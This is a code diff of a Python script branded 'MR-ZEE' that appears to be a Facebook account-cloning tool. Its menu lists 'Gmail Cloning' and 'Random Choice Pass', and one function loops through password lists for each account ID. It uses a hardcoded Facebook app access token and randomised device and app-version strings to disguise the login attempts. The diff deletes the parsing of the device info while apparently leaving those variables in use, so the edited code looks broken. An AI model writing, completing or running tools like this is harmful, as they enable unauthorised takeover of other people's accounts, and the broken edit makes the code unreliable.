@@ -216,7 +216,8 @@ def menu():
 			print('\x1b[1;92m[3] Gmail Cloning\x1b[1;92m')
 			print('\x1b[1;92m[4] Random Choice Pass \x1b[1;92m')
 			print('\x1b[1;92m[5] Contact me on Whatsapp\x1b[1;92m')
-			print('\x1b[1;91m[6] Exit main menu')
+			print('\x1b[1;92m[6] Create Useragent \x1b[1;92m')
+			print('\x1b[1;91m[7] Exit main menu')
 			linex()
 			zee=input(' Choose an option: ')
 			if zee in ['1','01']:
@@ -296,11 +297,13 @@ def menu():
 			elif zee in ['5','05']:
 				os.system('xdg-open https:/wa.me/+923030362621');menu()
 			elif zee in ['6','06']:
+				useragent()
+			elif zee in ['7','07']:
 				exit('')
 			else:
 				exit(' Option not found in menu...')
 
-def pasw(self):
+def useragent():
                 passlist = []
                 if not os.path.exists('device_info.txt'):
                         os.system('clear')
@@ -341,15 +344,6 @@ def m1(ids,passlist):
         sys.stdout.write('\r\r\033[1;37m [MR-ZEE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
-			infos = open('device_info.txt','r').read()
-                        try:
-                                version_,model_,brand_name_,width_,height_,build_,operator_,density_=infos.split('$')
-                        except:
-                                version_ = str(random.randint(7,13))
-                                model_ = "Infinix"
-                                brand_name_ = "Infinix"
-                                width_ = "720"
-                                height_ = "1280"
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                         fbbv = str(random.randint(111111111,999999999))
